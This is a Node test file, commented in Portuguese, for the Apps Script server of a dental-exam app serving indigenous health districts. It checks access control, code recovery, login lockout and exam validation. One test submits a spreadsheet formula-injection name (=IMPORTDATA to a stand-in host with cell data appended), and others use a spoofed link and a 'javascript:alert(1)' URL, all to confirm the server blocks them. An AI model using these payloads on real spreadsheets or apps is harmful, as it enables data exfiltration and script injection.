// Testes do servidor (Codigo.gs) no simulador do Apps Script. Rodam no computador (node testes/servidor.test.js)
// e no GitHub a cada envio. Não usam dados reais nem senhas reais: o cenário é montado do zero pelos fluxos do app.
const { cenario, exame } = require("./cenario.js");
let falhas = 0, total = 0, secao = "";
const T = (nome, cond, extra) => {
  total++;
  if (!cond) { falhas++; console.log("FALHA " + secao + " › " + nome + (extra === undefined ? "" : " → " + JSON.stringify(extra).slice(0, 400))); }
  else if (process.env.VERBOSO) console.log("ok    " + secao + " › " + nome);
};
const parte = n => { secao = n; };
const hojeBR = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/Sao_Paulo" }).format(new Date());
const amanhaBR = () => new Intl.DateTimeFormat("en-CA", { timeZone: "America/Sao_Paulo" }).format(new Date(Date.now() + 86400000));

const S = cenario();
const { G, P, C, RT, ANA, BRUNO, CARLA, BETO, PAULA } = S;
const aba = n => G.est.sheets[n] || [];
const col = (n, c) => aba(n)[0].indexOf(c);
const linhaEx = id => aba("Exames").find(l => l[0] === id);
const jsonEx = id => JSON.parse(linhaEx(id).at(-1));
const mailsPara = e => G.est.mails.filter(m => m.to === e);
const URL_OFICIAL = "https://luanabrisolla-creator.github.io/odontograma-v2/";
let r;

/* ---------------------------------------------------------------- instalação */
parte("instalação");
r = G.get();
T("servidor informa a versão", r.ok && typeof r.versao === "number" && r.versao >= 28, r.versao);
T("planilha vazia foi organizada sozinha no primeiro uso", G.ctx.formatoAtual(), G.est.props.FORMATO_PLANILHA);
T("abas principais na ordem", aba("Exames").length && G.est.order.slice(0, 6).join() === "Exames,Dentes,Acessos,Uso,Usuarios,Dicionário", G.est.order);
T("backup feito antes da organização", G.est.backups.length >= 1);

/* ---------------------------------------------------------------- cadastro e perfis */
parte("cadastro");
r = P(ANA, { acao: "entrar" });
T("dentista aprovada pela RT entra", r.ok && r.usuario.perfil === "dentista" && r.usuario.dsei === "Yanomami", r);
r = P(PAULA, { acao: "entrar" });
T("coordenação + RT entra como coord com DSEI", r.ok && r.usuario.perfil === "coord" && r.usuario.dsei === "Leste de Roraima", r.usuario);
r = P({ email: ANA.email, codigo: "ERRADO-0000-0000" }, { acao: "entrar" });
T("código errado é recusado", !r.ok && r.semAcesso);
r = P(null, { acao: "pedirAcesso", nome: "Novo", cro: "MT 1", email: "novo@teste.org", uf: "MT", dsei: "Xavante", perfil: "dentista" });
const idNovo = S.idDe("novo@teste.org");
r = P(RT, { acao: "aprovar", id: idNovo });
T("RT não aprova dentista de outro DSEI", !r.ok, r);
r = P(BETO, { acao: "aprovar", id: idNovo });
T("RT do DSEI aprova", r.ok, r);
r = P(null, { acao: "pedirAcesso", nome: "Zé", cro: "RR 1", email: "ze@teste.org", uf: "RR", dsei: "Teste" });
T("pedido com DSEI fora da lista é recusado", !r.ok);
r = P(null, { acao: "pedirAcesso", nome: "Zé", cro: "RR 1", email: "ze@teste.org", uf: "SP", dsei: "Yanomami" });
T("pedido com UF que não é do DSEI é recusado", !r.ok);

/* ---------------------------------------------------------------- planilha: fórmulas */
parte("planilha");
const nomeMau = '=IMPORTDATA("https://exemplo.invalido/?x="&A1)';
r = P(null, { acao: "pedirAcesso", nome: nomeMau, cro: "+5511", email: "formula@teste.org", uf: "RR", dsei: "Yanomami", polo: "@polo", perfil: "dentista" });
T("pedido de acesso com fórmula no nome é aceito como texto", r.ok, r);
const linhaF = aba("Usuarios").find(l => l[3] === "formula@teste.org");
T("nome, CRO e polo gravados com proteção (sem virar fórmula)", G.est.formulas.length === 0 && linhaF[1] === "'" + nomeMau, G.est.formulas.slice(0, 3));
const lido = G.ctx.lerUsuarios().find(u => u.email === "formula@teste.org");
T("ao ler, o nome volta igual ao digitado", lido && lido.nome === nomeMau && lido.cro === "+5511", lido && lido.nome);

/* ---------------------------------------------------------------- e-mails usam o endereço oficial */
parte("endereço dos e-mails");
const ruim = "https://site-falso.invalido/";
let n0 = G.est.mails.length;
r = G.post({ acao: "reenviarCodigo", email: ANA.email, link: ruim });
let m = G.est.mails.slice(n0).find(x => x.to === ANA.email);
T("recuperação: o link do e-mail é o oficial, mesmo se o navegador mandar outro", r.ok && m && m.body.includes(URL_OFICIAL + "?recuperar=") && !m.body.includes("site-falso"), m && m.body);
n0 = G.est.mails.length;
r = G.post({ acao: "pedirAcesso", nome: "Fulana", cro: "RR 9", email: "fulana@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista", link: ruim });
const avisos = G.est.mails.slice(n0);
T("pedido de acesso: o aviso para a RT leva o endereço oficial", avisos.length && avisos.every(x => !x.body.includes("site-falso")) && avisos.some(x => x.body.includes(URL_OFICIAL)), avisos.map(x => x.body.slice(0, 200)));
n0 = G.est.mails.length;
r = P(RT, { acao: "convidar", perfil: "dentista", emails: "convidada@teste.org", link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "convidada@teste.org");
T("convite: o link é o oficial", r.ok && m && m.body.includes(URL_OFICIAL + "?convite=") && !m.body.includes("site-falso") && r.resultados[0].link.startsWith(URL_OFICIAL), m && m.body);
n0 = G.est.mails.length;
r = P(RT, { acao: "aprovar", id: S.idDe("fulana@teste.org"), link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "fulana@teste.org");
T("aprovação: o e-mail com o código leva o endereço oficial", r.ok && m && m.body.includes(URL_OFICIAL) && !m.body.includes("site-falso"), m && m.body);
G.est.props.URL_APP = "https://odontograma.exemplo.org/app";
n0 = G.est.mails.length;
P(RT, { acao: "convidar", perfil: "dentista", emails: "outra@teste.org", link: ruim });
m = G.est.mails.slice(n0).find(x => x.to === "outra@teste.org");
T("endereço configurável em Propriedades do script (URL_APP)", m && m.body.includes("https://odontograma.exemplo.org/app/?convite="), m && m.body);
G.est.props.URL_APP = "javascript:alert(1)";
T("URL_APP inválida volta para o endereço oficial", G.ctx.urlApp() === URL_OFICIAL);
delete G.est.props.URL_APP;

/* ---------------------------------------------------------------- convite até o fim */
parte("convites");
const tokConv = (mailsPara("convidada@teste.org").at(-1).body.match(/convite=([0-9a-f]+)/) || [])[1];
r = G.post({ acao: "verConvite", convite: tokConv });
T("convite válido é reconhecido", r.ok && r.convite.dsei === "Yanomami", r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "SP" });
T("aceitar com UF de fora do DSEI é recusado", !r.ok, r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "RR" });
T("aceitar o convite cria acesso ativo", r.ok && r.usuario && r.usuario.status === "ativo", r);
r = G.post({ acao: "aceitarConvite", convite: tokConv, nome: "Convidada", cro: "RR 55", uf: "RR" });
T("o mesmo convite não serve duas vezes", !r.ok);

/* ---------------------------------------------------------------- recuperação de código */
parte("recuperação");
const pedirRec = e => { G.post({ acao: "reenviarCodigo", email: e }); return (mailsPara(e).at(-1).body.match(/recuperar=([0-9a-f]+)/) || [])[1]; };
const tokB = pedirRec(BRUNO.email);
T("o pedido não troca o código: o antigo continua valendo", P(BRUNO, { acao: "entrar" }).ok);
r = G.post({ acao: "confirmarRecuperacao", recuperar: "abcdef0123456789abcdef" });
T("link inventado é recusado", !r.ok);
r = G.post({ acao: "confirmarRecuperacao", recuperar: tokB });
T("confirmar gera o código novo e mostra na tela", r.ok && /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(r.codigo), r);
const novoB = r.codigo;
T("depois de confirmar, o código antigo para de valer", !P(BRUNO, { acao: "entrar" }).ok);
BRUNO.codigo = novoB;
T("o código novo vale", P(BRUNO, { acao: "entrar" }).ok);
T("o código novo também vai por e-mail", mailsPara(BRUNO.email).some(x => x.body.includes(novoB)));
T("link já usado não serve de novo", !G.post({ acao: "confirmarRecuperacao", recuperar: tokB }).ok);
const tokV = pedirRec(BRUNO.email);
aba("_recuperacoes").forEach((l, i) => { if (i) l[4] = "2020-01-01T00:00:00.000Z"; });
r = G.post({ acao: "confirmarRecuperacao", recuperar: tokV });
T("link vencido é recusado", !r.ok && /expirou/.test(r.erro), r);
G.post({ acao: "reenviarCodigo", email: BRUNO.email });
r = G.post({ acao: "reenviarCodigo", email: BRUNO.email });
T("no máximo 3 pedidos por hora por e-mail", !r.ok && /hora/.test(r.erro), r);
n0 = G.est.mails.length;
r = G.post({ acao: "reenviarCodigo", email: "ninguem@teste.org" });
T("e-mail sem acesso: mesma resposta e nenhum e-mail enviado", r.ok && G.est.mails.length === n0);

/* ---------------------------------------------------------------- limite de tentativas */
parte("login");
for (let i = 0; i < 21; i++) P({ email: CARLA.email, codigo: "ERRADO-" + i }, { acao: "entrar" });
r = P({ email: CARLA.email, codigo: "ERRADO-X" }, { acao: "entrar" });
T("depois de 20 erros, as tentativas erradas recebem 'bloqueado'", !r.ok && r.bloqueado, r);
r = P(CARLA, { acao: "entrar" });
T("profissional com o código certo entra mesmo depois de 20 erros de outra pessoa", r.ok, r);
r = P({ email: CARLA.email, codigo: "ERRADO-Y" }, { acao: "entrar" });
T("entrar zera o contador de erros", !r.ok && !r.bloqueado, r);
for (let i = 0; i < 21; i++) P({ email: C.email, codigo: "errada-" + i }, { acao: "entrar" });
r = P(C, { acao: "entrar" });
T("coordenação titular: bloqueio vale até para a senha certa (senha escolhida por pessoa)", !r.ok && r.bloqueado, r);
Object.keys(G.est.cache).forEach(k => { if (k.includes(C.email)) G.est.cache[k].exp = 0; });
T("titular volta a entrar depois do tempo", P(C, { acao: "entrar" }).ok);
G.est.props.CHAVE_COORDENACAO = "curta123";
r = P({ email: C.email, codigo: "curta123" }, { acao: "admin" });
T("Administração avisa quando a senha da titular tem menos de 12 caracteres", r.ok && r.senhaCurta === true, r.senhaCurta);
G.est.props.CHAVE_COORDENACAO = S.SENHA_TITULAR;
T("senha longa: sem aviso", P(C, { acao: "admin" }).senhaCurta === false);

/* ---------------------------------------------------------------- corrida no login */
parte("concorrência");
// Simula: a RT desativa a Ana no mesmo instante em que o app dela faz o primeiro acesso do dia.
const realLer = G.ctx.lerUsuarios;
const linhaAna = aba("Usuarios").findIndex(l => l[3] === ANA.email);
aba("Usuarios")[linhaAna][col("Usuarios", "ultimo_acesso")] = "2020-01-01T00:00:00.000Z";
const fotoAntiga = realLer();
aba("Usuarios")[linhaAna][col("Usuarios", "status")] = "desativado";
G.ctx.lerUsuarios = () => JSON.parse(JSON.stringify(fotoAntiga));
P(ANA, { acao: "painel" });
G.ctx.lerUsuarios = realLer;
T("o login atrasado grava só o último acesso e não desfaz a desativação", aba("Usuarios")[linhaAna][col("Usuarios", "status")] === "desativado" && aba("Usuarios")[linhaAna][col("Usuarios", "ultimo_acesso")] > "2026", aba("Usuarios")[linhaAna]);
aba("Usuarios")[linhaAna][col("Usuarios", "status")] = "ativo";

/* ---------------------------------------------------------------- exames: validação */
parte("validação do exame");
const tenta = (nome, mexe, re, cred) => {
  const e = exame(); mexe(e); const n = aba("Exames").length;
  const x = P(cred || ANA, { acao: "enviarExame", registro: e });
  T("recusa: " + nome, !x.ok && re.test(x.erro || "") && aba("Exames").length === n, x.erro || x);
};
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OK1", sufixo: "KAAAAAA2" }) });
T("exame completo é gravado", r.ok && linhaEx("OK1"), r);
tenta("sem sexo (\"Não informado\")", e => { e.crianca.sexo = ""; }, /sexo/);
tenta("sexo fora de F/M", e => { e.crianca.sexo = "NI"; }, /sexo/);
tenta("sem local de atendimento", e => { e.localAtendimento = ""; }, /local/);
tenta("sem vigilância", e => { e.vigilancia = []; }, /vigilância/);
tenta("'Não identificado' junto com outro item", e => { e.vigilancia = ["Não identificado", "Dor de dente"]; }, /vigilância/);
tenta("placa sem resposta", e => { e.placa = null; }, /placa/);
tenta("gengivite como texto", e => { e.gengivite = "sim"; }, /gengivite/);
tenta("data impossível (31/02)", e => { e.dataExame = "2026-02-31"; }, /data do exame/);
tenta("exame de amanhã", e => { e.dataExame = amanhaBR(); }, /futuro/);
tenta("nascimento impossível", e => { e.crianca.nascimento = "2019-04-31"; }, /nascimento/);
tenta("nascimento depois do exame", e => { e.crianca.nascimento = "2026-12-01"; }, /nascimento/);
tenta("dentição inválida", e => { e.denticao = "outra"; }, /dentição/);
tenta("UF que não é do DSEI", e => { e.uf = "SP"; }, /UF/);
tenta("odontograma incompleto (faltando dentes)", e => { delete e.dentes[36]; delete e.dentes[55]; }, /incompleto/);
tenta("dente fora da dentição", e => { e.dentes[99] = e.dentes[11]; }, /fora da dentição/);
tenta("dente ainda com ?", e => { e.dentes[16].status = "a_confirmar"; }, /conferir/);
tenta("face com situação desconhecida", e => { e.dentes[16].faces.O = "xyz"; }, /situação/);
tenta("dor como texto", e => { e.dentes[16].dor = "sim"; }, /dor, procedimentos/);
tenta("procedimento inexistente", e => { e.dentes[16].procs = { inventado: "realizado" }; }, /procedimentos/);
tenta("procedimento com valor inválido", e => { e.dentes[16].procs = { selante: "feito" }; }, /procedimentos/);
tenta("procedimento coletivo fora da lista", e => { e.gerais = ["Coisa inventada"]; }, /coletivos/);
tenta("insumo fora da lista", e => { e.insumos = ["Bala"]; }, /insumos/);
tenta("código de acompanhamento fora do formato", e => { e.codigo = e.codigoIndividuo = "QUALQUER-COISA"; }, /formato/);
tenta("código com a UF de outro DSEI", e => { e.codigo = e.codigoIndividuo = "SP-SUR-SAU-ABCDEFGH"; }, /UF do DSEI/);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OK2", sufixo: "KBBBBBB2", data: hojeBR(), gerais: ["Escovação supervisionada"], insumos: ["Escova dental"], mud: { 16: { procs: { selante: "realizado", verniz: "indicado" } } } }) });
T("exame de hoje, com procedimentos, coletivos e insumos válidos, passa", r.ok, r);
tenta("código no formato antigo (UF-polo-aldeia-CRO-sequência)", e => { e.codigo = e.codigoIndividuo = "RR-SUR-SAU-4471-0007"; }, /formato/);
tenta("código com a parte do polo vazia", e => { e.codigo = e.codigoIndividuo = "RR--SAU-KCCCCCC2"; }, /formato/);
tenta("código com mais de 3 caracteres na aldeia", e => { e.codigo = e.codigoIndividuo = "RR-SUR-SAUB-KCCCCCC2"; }, /formato/);
T("reserva também recusa parte vazia", !P(ANA, { acao: "reservarCodigo", codigoReserva: "RR-SUR--KCCCCCC2", exameId: "RVZ" }).ok);
T("planilha: código que bate com o local do exame → codigo_confere_local = sim", linhaEx("OK1")[col("Exames", "codigo_confere_local")] === "sim", linhaEx("OK1")[col("Exames", "codigo_confere_local")]);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "OKLOC", codigo: "RR-SUR-HAK-KDDDDDD2", aldeia: "Saúba" }) });
T("código que não bate com a aldeia do exame é aceito, mas sinalizado (codigo_confere_local = não)", r.ok && linhaEx("OKLOC")[col("Exames", "codigo_confere_local")] === "não", r);
T("o dicionário da planilha explica a coluna codigo_confere_local", aba("Dicionário").some(l => l[1] === "codigo_confere_local") || Object.keys(G.est.sheets).some(n => /icion/.test(n) && G.est.sheets[n].some(l => l.includes("codigo_confere_local"))));

/* ---------------------------------------------------------------- exames: DSEI */
parte("DSEI");
tenta("CD manda exame de outro DSEI", e => { e.dsei = "Leste de Roraima"; }, /DSEI Yanomami/);
tenta("RT manda exame de outro DSEI", e => { e.dsei = "Yanomami"; e.uf = "RR"; }, /DSEI Xavante/, BETO);
tenta("coordenação + RT manda exame fora do DSEI de RT", e => { e.dsei = "Yanomami"; }, /Leste de Roraima/, PAULA);
r = P(PAULA, { acao: "enviarExame", registro: exame({ id: "PAULA1", dsei: "Leste de Roraima", sufixo: "PAVXAAA2", aldeia: "Maturuca", polo: "Surumu" }) });
T("coordenação + RT grava no próprio DSEI de RT", r.ok, r);
T("coordenação titular não registra exame", !P(C, { acao: "enviarExame", registro: exame({ dsei: "Yanomami" }) }).ok);

/* ---------------------------------------------------------------- resultado calculado no servidor */
parte("índices");
const fr = exame({ id: "IDX1", sufixo: "NDCESAB2", mud: { 16: { status: "raiz" }, 26: { status: "extr_ind" }, 36: { status: "ausente_carie" }, 54: { status: "ausente_carie" }, 55: { status: "extr_ind" }, 64: { status: "raiz" }, 46: { faces: { O: "ca", M: "rest" } }, 75: { faces: { O: "rest", V: "mba" } } } });
fr.resultado = { classe: "A", ceod: { c: 0, e: 0, o: 0, total: 0 }, cpod: { c: 0, p: 0, o: 0, total: 0 } };
r = P(ANA, { acao: "enviarExame", registro: fr });
const g = jsonEx("IDX1").resultado;
T("o servidor ignora a classe mandada pelo navegador", r.ok && g.classe === "E", g.classe);
T("CPO-D: raiz residual, extração indicada e extraído por cárie entram em P", g.cpod.p === 3, g.cpod);
T("CPO-D: cárie com restauração no mesmo dente conta como C", g.cpod.c === 1, g.cpod);
T("ceo-d: extração indicada e raiz residual entram em e; decíduo ausente não conta", g.ceod.e === 2 && g.ceod.total === 3, g.ceod);
T("ceo-d: mancha branca com restauração conta como o", g.ceod.o === 1, g.ceod);
T("divergência de classe registrada nos Acessos", aba("Acessos").some(l => l[7] === "Resultado recalculado"));

/* ---------------------------------------------------------------- código de acompanhamento */
parte("código");
r = P(ANA, { acao: "reservarCodigo", codigoReserva: "RR-SUR-HAK-RESERVA2", exameId: "RES1" });
T("reserva um código livre", r.ok && r.reservado, r);
r = P(BRUNO, { acao: "reservarCodigo", codigoReserva: "RR-SUR-HAK-RESERVA2", exameId: "RES2" });
T("outro aparelho não recebe o mesmo código", r.ok && r.ocupado, r);
r = P(BRUNO, { acao: "reservarCodigo", codigoReserva: "RR-SUR-SAU-KAAAAAA2", exameId: "RES3" });
T("código já usado por uma pessoa não é reservado", r.ok && r.ocupado, r);
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "COL1", codigo: "RR-SUR-SAU-KAAAAAA2" }) });
T("código repetido no envio: recusado, sem '-2' e sem juntar pessoas", !r.ok && r.codigoRepetido && !linhaEx("COL1"), r);
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "COL2", codigo: "RR-SUR-HAK-RESERVA2" }) });
T("código reservado por outro exame: recusado", !r.ok && r.codigoRepetido, r);

/* ---------------------------------------------------------------- mesma pessoa, buscas e histórico */
parte("acompanhamento");
const seg = exame({ id: "OK1-B", data: "2026-10-15", vinculo: { codigoIndividuo: "RR-SUR-SAU-KAAAAAA2", chaves: [] } });
r = P(BRUNO, { acao: "enviarExame", registro: seg });
T("2º exame da mesma pessoa, por outro dentista do DSEI", r.ok && r.numeroExame === 2 && r.codigoIndividuo === "RR-SUR-SAU-KAAAAAA2", r);
r = P(BRUNO, { acao: "buscarCodigo", codigoBusca: "rr-sur-sau-kaaaaaa2", dsei: "Yanomami" });
T("busca pelo código acha a pessoa", r.ok && r.pessoa && r.pessoa.exames === 2, r);
r = P(CARLA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Yanomami" });
T("CD de outro DSEI não escolhe o DSEI da busca", r.ok && !r.pessoa && r.foraDoDsei === "Leste de Roraima", r);
r = P(CARLA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Leste de Roraima" });
T("para CD, código de outro DSEI é só 'não localizado no seu DSEI'", r.ok && !r.pessoa && !r.outroDsei && r.foraDoSeuDsei, r);
r = P(C, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-KAAAAAA2", dsei: "Leste de Roraima" });
T("a coordenação vê qual é o DSEI do código", r.ok && r.outroDsei === "Yanomami", r);
r = P(BRUNO, { acao: "buscarPessoa", dsei: "Yanomami", aldeia: "Hakoma", nascimento: "2018-05-12", sexo: "F" });
T("busca sem código sugere pessoa de outra aldeia do DSEI, marcada", r.ok && r.outrasAldeias && r.candidatos.length && r.candidatos.every(c => c.outraAldeia), r.candidatos && r.candidatos.map(c => c.outraAldeia));
T("histórico: dentista do mesmo DSEI vê (continuidade do cuidado)", P(BRUNO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: dentista de outro DSEI não vê", !P(CARLA, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: RT de outro DSEI não vê", !P(BETO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);
T("histórico: coordenação vê", P(C, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-KAAAAAA2" }).ok);

/* ---------------------------------------------------------------- código em mais de um DSEI (defesa) */
parte("código em dois DSEIs");
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "MD1", sufixo: "MDMDMDM2" }) });
r = P(BRUNO, { acao: "enviarExame", registro: exame({ id: "MD2", data: "2026-10-12", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }) });
T("pessoa com dois exames no mesmo DSEI", r.ok && r.numeroExame === 2, r);
// Simula um dado corrompido: um dos exames aparece em outro DSEI na planilha.
(() => { const l = linhaEx("MD2"), j = JSON.parse(l.at(-1)); j.dsei = "Leste de Roraima"; l[col("Exames", "dsei")] = "Leste de Roraima"; l[l.length - 1] = JSON.stringify(j); })();
const mails0 = mailsPara("coord@teste.org").length;
r = P(BRUNO, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-MDMDMDM2" });
T("CD do DSEI não vê o histórico de código com exames em dois DSEIs", !r.ok, r);
T("fica registrado em Acessos como Segurança", aba("Acessos").some(l => l[7] === "Código em mais de um DSEI" && l[6] === "Segurança"));
T("a coordenação recebe um e-mail de aviso", mailsPara("coord@teste.org").length === mails0 + 1 && /mais de um DSEI/.test(mailsPara("coord@teste.org").at(-1).subject), mailsPara("coord@teste.org").length - mails0);
r = P(ANA, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-MDMDMDM2", dsei: "Yanomami" });
T("a busca pelo código não devolve a pessoa para CD", r.ok && !r.pessoa && r.foraDoSeuDsei, r);
T("nova tentativa não manda outro e-mail (no máximo um aviso a cada 6 h)", mailsPara("coord@teste.org").length === mails0 + 1);
r = P(C, { acao: "pessoa", codigoIndividuo: "RR-SUR-SAU-MDMDMDM2" });
T("a coordenação continua vendo, para corrigir", r.ok && r.exames.length === 2, r);
r = P(C, { acao: "buscarCodigo", codigoBusca: "RR-SUR-SAU-MDMDMDM2", dsei: "Yanomami" });
T("para a coordenação, a busca diz que o código está em conferência", r.ok && r.emConferencia && /Leste de Roraima/.test(r.outroDsei), r);
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "MD3", data: "2026-10-14", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }) });
T("não dá para juntar novo exame a esse código", !r.ok && r.vinculoInvalido && !linhaEx("MD3"), r);
const md2 = Object.assign(exame({ id: "MD2", data: "2026-10-12", vinculo: { codigoIndividuo: "RR-SUR-SAU-MDMDMDM2", chaves: [] } }), { atualizadoEm: "2026-10-20T12:00:00.000Z" });
r = P(BRUNO, { acao: "enviarExame", registro: md2 });
T("exame gravado num DSEI não pode ser reenviado como de outro DSEI", !r.ok && r.dseiInvalido && linhaEx("MD2")[col("Exames", "dsei")] === "Leste de Roraima", r);

/* ---------------------------------------------------------------- painel */
parte("painel");
for (let i = 0; i < 6; i++) P(BRUNO, { acao: "enviarExame", registro: exame({ id: "PN" + i, sufixo: "PANEX" + "ABCDEF"[i] + "22", nasc: "2016-0" + (i + 1) + "-10", idade: 10, mud: i < 3 ? { 46: { faces: { O: "ca" } } } : {} }) });
r = P(C, { acao: "painel" });
T("painel geral responde", r.ok && r.resumo && r.resumo.n > 0, r.erro);
T("uma pessoa com 2 exames conta uma vez; exames contam todos", r.resumo.nExames > r.resumo.n, [r.resumo.n, r.resumo.nExames]);
T("faixa etária traz ceo-d e CPO-D com componentes", r.resumo.faixas["6 a 11 anos"].cpod && "p" in r.resumo.faixas["6 a 11 anos"].cpod);
T("comparação entre DSEIs não mostra percentual que revela grupo pequeno", r.comparacao.every(c => c.n === "<5" || c.alto !== "<5" || c.pctAlto == null), r.comparacao);
r = P(CARLA, { acao: "painel", dsei: "Yanomami" });
T("CD vê dados agregados de outro DSEI", r.ok && r.recorteDsei === "Yanomami");
T("painel agregado não traz códigos de pessoas", !JSON.stringify(r).includes("RR-SUR-SAU-KAAAAAA2"));

/* ---------------------------------------------------------------- reorganização da planilha */
parte("reorganização");
// Muitos exames com resultado errado, para conferir que o relatório lista todos (não só os primeiros).
for (let i = 0; i < 25; i++) P(ANA, { acao: "enviarExame", registro: exame({ id: "RL" + i, sufixo: "RQ" + "ABCDEFGHJKMNPQRSTUVWXYZ23"[i] + "XXXX2" }) });
for (let i = 0; i < 25; i++) { const j = jsonEx("RL" + i); j.resultado.cpod = { c: 4, p: 0, o: 0, total: 4 }; linhaEx("RL" + i)[aba("Exames")[0].length - 1] = JSON.stringify(j); }
const examesAntes = JSON.stringify(aba("Exames"));
const comErro = jsonEx("OK1"); comErro.resultado.ceod = { c: 0, e: 9, o: 0, total: 9 };
linhaEx("OK1")[aba("Exames")[0].length - 1] = JSON.stringify(comErro);
G.est.props.FORMATO_PLANILHA = "21";
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "DURANTE", sufixo: "DURANTE2" }) });
T("com exames na planilha, a reorganização NÃO acontece sozinha", G.est.props.FORMATO_PLANILHA === "21");
T("enquanto pendente, envio de exame espera (manutenção) e nada é gravado", !r.ok && r.manutencao && !linhaEx("DURANTE"), r);
T("pedido de acesso também espera", G.post({ acao: "pedirAcesso", nome: "A", cro: "RR 3", email: "durante@teste.org", uf: "RR", dsei: "Yanomami" }).manutencao === true);
r = P(ANA, { acao: "painel" });
T("leituras continuam funcionando", r.ok, r.erro);
r = P(C, { acao: "entrar" });
T("a titular é avisada ao entrar", r.ok && r.reorganizacaoPendente === true, r);
T("Administração mostra a pendência", P(C, { acao: "admin" }).reorganizacaoPendente === true);
r = P(PAULA, { acao: "reorganizar" });
T("só a coordenação titular confirma", !r.ok && G.est.props.FORMATO_PLANILHA === "21", r);
r = P(C, { acao: "previaReorganizacao" });
T("prévia mostra quantos exames mudam, sem gravar nada", r.ok && r.relatorio.mudam >= 1 && r.relatorio.ceod >= 1 && G.est.props.FORMATO_PLANILHA === "21", r.relatorio);
G.est.falharBackup = true;
r = P(C, { acao: "reorganizar" });
T("se o backup falhar, a reorganização é cancelada e nada muda", !r.ok && /backup/.test(r.erro) && G.est.props.FORMATO_PLANILHA === "21" && jsonEx("OK1").resultado.ceod.e === 9, r);
G.est.falharBackup = false;
const nBackups = G.est.backups.length;
r = P(C, { acao: "reorganizar" });
T("com backup, a titular atualiza a planilha", r.ok && G.ctx.formatoAtual() && G.est.backups.length === nBackups + 1, r);
T("o resultado errado foi recalculado", jsonEx("OK1").resultado.ceod.e === 0);
T("relatório antes/depois gravado na planilha", aba("Relatório da reorganização").some(l => l[0] === "OK1"));
T("o relatório lista todos os exames que mudaram (26), não só uma amostra", aba("Relatório da reorganização").length - 1 === r.resultado.relatorio.mudam && r.resultado.relatorio.mudam >= 26, [aba("Relatório da reorganização").length - 1, r.resultado.relatorio.mudam]);
T("a resposta ao app leva no máximo 20 exemplos", r.resultado.relatorio.exemplos.length <= 20, r.resultado.relatorio.exemplos.length);
T("Acessos registra quantos exames mudaram e o backup", aba("Acessos").some(l => l[7] === "Reorganizou a planilha" && /com resultado recalculado/.test(l[8]) && /backup antes/.test(l[8])));
r = P(ANA, { acao: "enviarExame", registro: exame({ id: "DEPOIS", sufixo: "DEPXSAA2" }) });
T("depois de concluída, os envios voltam", r.ok, r);
T("os outros exames continuam lá", JSON.parse(examesAntes).length <= aba("Exames").length);

/* ---------------------------------------------------------------- reativação */
parte("reativação");
r = G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi Dentista", cro: "RR 4242", email: "davi@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
r = P(RT, { acao: "aprovar", id: S.idDe("davi@teste.org") });
const DAVI = { email: "davi@teste.org", codigo: S.codigoDoEmail("davi@teste.org") };
T("novo dentista aprovado entra", P(DAVI, { acao: "entrar" }).ok);
r = P(RT, { acao: "desativar", id: S.idDe("davi@teste.org") });
T("RT desativa o dentista", r.ok && !P(DAVI, { acao: "entrar" }).ok, r);
const mRT = mailsPara("rt@teste.org").length;
r = G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi D.", cro: "RR 9999", email: "davi@teste.org", uf: "RR", dsei: "Leste de Roraima", perfil: "rt" });
const davi = () => aba("Usuarios").slice(1).find(l => l[3] === "davi@teste.org");
T("pedido de quem foi desativado vira pedido de reativação", r.ok && r.reativacao === true, r);
T("o cadastro não muda: continua desativado, no mesmo DSEI e perfil", davi()[8] === "desativado" && davi()[5] === "Yanomami" && davi()[7] === "dentista" && davi()[1] === "Davi Dentista", davi());
T("a resposta avisa que DSEI e perfil continuam os do cadastro", r.mudouDados === true && r.dseiCadastro === "Yanomami");
T("a RT do DSEI recebe o aviso de reativação", mailsPara("rt@teste.org").length === mRT + 1 && /reativação/i.test(mailsPara("rt@teste.org").at(-1).subject));
T("Acessos registra \"Pediu reativação\"", aba("Acessos").some(l => l[7] === "Pediu reativação"));
T("a Equipe da RT mostra que a pessoa pediu reativação", (() => { const m = P(RT, { acao: "equipe" }).membros.find(x => x.email === "davi@teste.org"); return m && m.status === "desativado" && new Date(m.pedido_em) > new Date(m.aprovado_em); })());
G.post({ acao: "pedirAcesso", link: S.LINK, nome: "Davi Dentista", cro: "RR 4242", email: "davi@teste.org", uf: "RR", dsei: "Yanomami", perfil: "dentista" });
T("pedir de novo no mesmo dia não manda outro e-mail", mailsPara("rt@teste.org").length === mRT + 1);
r = P(RT, { acao: "reativar", id: S.idDe("davi@teste.org") });
T("a RT reativa e a pessoa volta a entrar com o código de antes", r.ok && P(DAVI, { acao: "entrar" }).ok, r);
